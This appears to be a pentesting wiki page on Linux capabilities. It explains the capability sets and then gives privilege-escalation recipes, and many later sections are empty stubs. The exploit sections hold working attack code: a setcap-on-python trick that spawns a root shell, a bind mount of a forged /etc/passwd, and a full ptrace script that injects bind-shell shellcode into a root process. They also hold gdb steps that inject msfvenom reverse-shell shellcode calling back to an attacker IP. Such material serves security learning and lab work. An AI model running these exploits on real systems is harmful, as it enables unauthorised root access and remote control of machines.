# Capabilities

## Theory

Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation

### Capabilities Sets

Conceptually capabilities are maintained in sets, which are represented as bit masks. For all running processes capability information is maintained per thread; for binaries in the file system it’s stored in extended attributes. Thread capability sets are copied on `fork()` and specially transformed on `execve()`

{% tabs %}
{% tab title="CapEff" %}
**CapEff** is the effective capability set represents all capabilities the process is using at the moment (this is the actual set of capabilities that the kernel uses for permission checks). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary. This makes it possible for binaries that are not capability-aware to make use of file capabilities without issuing special system calls.
{% endtab %}

{% tab title="CapPrm" %}
**CapPrm** is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset() system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap\_setpcap capability in its thread effective set.
{% endtab %}

{% tab title="CapInh" %}
**CapInh**, using the inherited set all capabilities that are allowed to be inherited from a parent process can be specified. This prevents a process from receiving any capabilities it does not need. This set is preserved across an execve and is usually set by a process receiving capabilities rather than by a process that’s handing out capabilities to its children.
{% endtab %}

{% tab title="CapBnd" %}
**CapBnd**, With the bounding set it’s possible to restrict the capabilities a process may ever receive. Only capabilities that are present in the bounding set will be allowed in the inheritable and permitted sets.
{% endtab %}

{% tab title="CapAmb" %}
**CapAmb** is the ambient capability set applies to all non-SUID binaries without file capabilities. It preserves capabilities when calling execve. However, not all capabilities in the ambient set may be preserved because they are being dropped in case they are not present in either the inheritable or permitted capability set. This set is preserved across execve calls.
{% endtab %}
{% endtabs %}

## Practice

### Processes Capabilities

{% tabs %}
{% tab title="Enumerate" %}
We can can find the capabilities of a process as follow

```bash
#List current process capabilities
cat /proc/self/status | grep Cap
cat /proc/$$/status | grep Cap
capsh --print

#List capabilities of <PID> process
cat /proc/<PID>/status | grep Cap
```

Using the capsh utility we can decode them into the capabilities name.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
{% endtab %}
{% endtabs %}

### Binaries Capabilities

{% hint style="danger" %}
Having the capability =ep means the binary has all the capabilities
{% endhint %}

{% tabs %}
{% tab title="Enumerate" %}
Binaries can have capabilities that can be used while executing. We can search binaries with capabilities as follow

```bash
getcap -r / 2>/dev/null
```
{% endtab %}

{% tab title="Exploit" %}
If you find that a binary have interesting capabilities, you can check on [GTFOBins](https://gtfobins.github.io/) for known exploits.
{% endtab %}
{% endtabs %}

### Setcap with SUID/SUDO

{% tabs %}
{% tab title="Enumerate" %}
If you found the `setcap` binary with the SUID bit or with SUDO permissions, you can obtain root access.

```bash
#SUID
$ find / -type f -perm -4000 2>/dev/null
/usr/sbin/setcap

#SUDO
$ sudo -l
    (root) NOPASSWD: /usr/sbin/setcap /home/<user>/*
```
{% endtab %}

{% tab title="Exploit" %}
For example, we can leverage the `CAP_SETUID` capabilities with the `python` binary&#x20;

```bash
#SUID setcap example
cp /usr/bin/python3 /home/<user>/python3
setcap cap_setuid+ep /home/<user>/python3

#Exploit
/home/<user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
{% endtab %}
{% endtabs %}

### Interesting Capabilities

#### CAP\_SYS\_ADMIN

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of **administrative operations**, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive. Among other things this allows to **mount devices** or abuse **release\_agent** to escape from the container.
{% endtab %}

{% tab title="Exploit" %}
For example, if python have the `CAP_SYS_ADMIN` capabilities,  we can mount a modified _passwd_ file on top of the real _passwd_ file.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

First generate the new passwd file

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Then we can use the following python script to mount it

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

{% hint style="info" %}
If you are in a docker container and `CAP_SYS_ADMIN` is enabled, then you can escape. See [this page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap\_sys\_admin) for more informations.
{% endhint %}
{% endtab %}
{% endtabs %}

#### CAP\_SYS\_PTRACE

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`. If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53).
{% endtab %}

{% tab title="Exploit" %}
For example, if **python** have the `CAP_SYS_PTRACE` capabilities,  we can inject a shellcode in a root process memory.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

We can use the following python code to inject our shellcode

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes)
shellcode =  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in range(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)

```

Now we can execute, and connect to the bind shell

```bash
#On target host
$ python2.7 ptrace.py <ROOT_PROCESS_PID>

#On attacking host
$ nc TARGET_IP 5600
```



Here is **an other PrivEsc example with `gdb`** if it have the `CAP_SYS_PTRACE` enabled

```bash
$ getcap -r / 2>/dev/null
/usr/bin/gdb = cap_sys_ptrace+ep
```

First, create a shellcode with msfvenom and python

```bash
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Then, debug a root process with gdb ad copy-paste the previously generated gdb lines:

```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

{% hint style="info" %}
If you are in a docker container and`CAP_SYS_PTRACE` is enabled, then it means that you can **escape** the container **by injecting a shellcode** inside some process running inside the **host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.\
See[ this page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap\_sys\_ptrace) for more informations.
{% endhint %}
{% endtab %}
{% endtabs %}

#### CAP\_SYS\_MODULE

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_DAC\_READ\_SEARCH

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_DAC\_OVERRIDE

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_CHOWN

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_FOWNER

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SETUID

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SETGID

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SETFCAP

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SYS\_RAWIO

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_KILL

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_NET\_BIND\_SERVICE

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_NET\_RAW

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_NET\_ADMIN + CAP\_NET\_RAW

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_LINUX\_IMMUTABLE

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SYS\_CHROOT

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SYS\_BOOT

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SYSLOG

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_MKNOD

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}

#### CAP\_SETPCAP

{% tabs %}
{% tab title="Desc" %}

{% endtab %}

{% tab title="Exploit" %}

{% endtab %}
{% endtabs %}



## References

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities" %}

{% embed url="https://blog.ploetzli.ch/2014/understanding-linux-capabilities/" %}
